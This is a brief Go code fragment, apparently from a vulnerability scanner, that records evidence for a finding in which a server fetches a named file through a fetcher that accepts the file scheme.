		f.Evidence.Baseline = truncate(t.Response.Body, 4096)
		f.Evidence.Matches = []string{
			"the server fetched a file it was asked for by name: " + signature,
			"the value reaches a fetcher that accepts the file scheme, so it is not limited to " +
				"addresses the caller was meant to reach",
		}
		f.Evidence.Diff = extractAround(string(response.Body), signature, 240)
		return f
	}
	return nil
}
